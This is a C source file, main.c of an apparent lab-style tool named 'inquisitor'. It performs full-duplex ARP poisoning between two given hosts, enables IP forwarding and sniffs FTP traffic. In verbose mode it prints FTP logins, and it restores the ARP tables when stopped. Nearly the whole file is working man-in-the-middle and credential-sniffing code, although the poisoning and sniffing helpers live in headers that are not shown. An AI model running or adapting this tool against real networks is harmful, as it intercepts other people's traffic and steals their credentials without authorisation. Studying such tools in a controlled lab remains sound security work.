#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <pcap.h>

#include "netutil.h"
#include "arp_packet.h"
#include "arp_poison.h"
#include "sniff_ftp.h"

#define POISON_INTERVAL_SEC 2
#define RESTORE_REPEATS 5

static volatile sig_atomic_t	g_stop = 0;
static pcap_t			*g_handle = NULL;

static void	handle_signal(int sig)
{
	(void)sig;
	g_stop = 1;
	if (g_handle)
		pcap_breakloop(g_handle);
}

static void	print_usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [-v|--verbose] <IP-src> <MAC-src> <IP-target> <MAC-target>\n\n"
		"Performs full-duplex ARP poisoning between the two given IPv4\n"
		"hosts and prints FTP filenames (or, with -v, all FTP traffic\n"
		"including the login) exchanged between them. CTRL+C restores\n"
		"both ARP tables before exiting.\n",
		prog);
}

typedef struct
{
	pcap_t			*handle;
	const poison_targets_t	*targets;
}	poison_thread_arg_t;

static void	*poison_loop(void *arg_)
{
	poison_thread_arg_t	*arg;

	arg = (poison_thread_arg_t *)arg_;
	while (!g_stop)
	{
		if (arp_poison_once(arg->handle, arg->targets) != 0)
			fprintf(stderr, "inquisitor: warning: %s\n", pcap_geterr(arg->handle));
		sleep(POISON_INTERVAL_SEC);
	}
	return (NULL);
}

static void	try_enable_ip_forward(void)
{
	FILE	*fp;

	fp = fopen("/proc/sys/net/ipv4/ip_forward", "w");
	if (!fp)
	{
		fprintf(stderr,
			"inquisitor: warning: could not enable IP forwarding "
			"(need NET_ADMIN / privileged mode); traffic between the "
			"two hosts may stop flowing through us\n");
		return;
	}
	fputs("1\n", fp);
	fclose(fp);
}

int	main(int argc, char **argv)
{
	int		verbose;
	const char	*pos[4];
	int		npos;
	int		i;
	poison_targets_t	targets;
	char		iface[64];
	char		errbuf[PCAP_ERRBUF_SIZE];
	char		macstr[32];
	pthread_t	poison_thread;
	poison_thread_arg_t	pargs;

	verbose = 0;
	npos = 0;
	for (i = 1; i < argc; i++)
	{
		if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0)
			verbose = 1;
		else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0)
		{
			print_usage(argv[0]);
			return (0);
		}
		else if (npos < 4)
			pos[npos++] = argv[i];
		else
		{
			fprintf(stderr, "inquisitor: error: too many arguments\n");
			print_usage(argv[0]);
			return (1);
		}
	}
	if (npos != 4)
	{
		fprintf(stderr, "inquisitor: error: expected 4 arguments, got %d\n", npos);
		print_usage(argv[0]);
		return (1);
	}

	if (parse_ipv4(pos[0], &targets.ip_a) != 0)
	{
		fprintf(stderr, "inquisitor: error: '%s' is not a valid IPv4 address\n", pos[0]);
		return (1);
	}
	if (parse_mac(pos[1], targets.mac_a) != 0)
	{
		fprintf(stderr, "inquisitor: error: '%s' is not a valid MAC address\n", pos[1]);
		return (1);
	}
	if (parse_ipv4(pos[2], &targets.ip_b) != 0)
	{
		fprintf(stderr, "inquisitor: error: '%s' is not a valid IPv4 address\n", pos[2]);
		return (1);
	}
	if (parse_mac(pos[3], targets.mac_b) != 0)
	{
		fprintf(stderr, "inquisitor: error: '%s' is not a valid MAC address\n", pos[3]);
		return (1);
	}

	if (find_default_interface(iface, sizeof(iface)) != 0)
	{
		fprintf(stderr, "inquisitor: error: no usable network interface found "
			"(set INQUISITOR_IFACE to override)\n");
		return (1);
	}
	if (get_interface_mac(iface, targets.our_mac) != 0)
	{
		fprintf(stderr, "inquisitor: error: could not read MAC address of '%s'\n", iface);
		return (1);
	}
	mac_to_str(targets.our_mac, macstr, sizeof(macstr));
	fprintf(stderr, "inquisitor: using interface %s (our MAC %s)\n", iface, macstr);

	g_handle = sniff_ftp_open(iface, errbuf);
	if (!g_handle)
	{
		fprintf(stderr, "inquisitor: error: could not open '%s': %s\n", iface, errbuf);
		return (1);
	}

	try_enable_ip_forward();

	signal(SIGINT, handle_signal);
	signal(SIGTERM, handle_signal);

	if (arp_poison_once(g_handle, &targets) != 0)
		fprintf(stderr, "inquisitor: warning: %s\n", pcap_geterr(g_handle));

	pargs.handle = g_handle;
	pargs.targets = &targets;
	if (pthread_create(&poison_thread, NULL, poison_loop, &pargs) != 0)
	{
		fprintf(stderr, "inquisitor: error: could not start poisoning thread\n");
		pcap_close(g_handle);
		return (1);
	}

	fprintf(stderr, "inquisitor: poisoning %s <-> %s, sniffing FTP (port 21)%s. "
		"CTRL+C to stop and restore ARP tables.\n",
		pos[0], pos[2], verbose ? " [verbose]" : "");

	sniff_ftp_run(g_handle, verbose);

	g_stop = 1;
	pthread_join(poison_thread, NULL);

	fprintf(stderr, "\ninquisitor: restoring ARP tables...\n");
	arp_restore(g_handle, &targets, RESTORE_REPEATS);
	pcap_close(g_handle);
	fprintf(stderr, "inquisitor: done.\n");
	return (0);
}
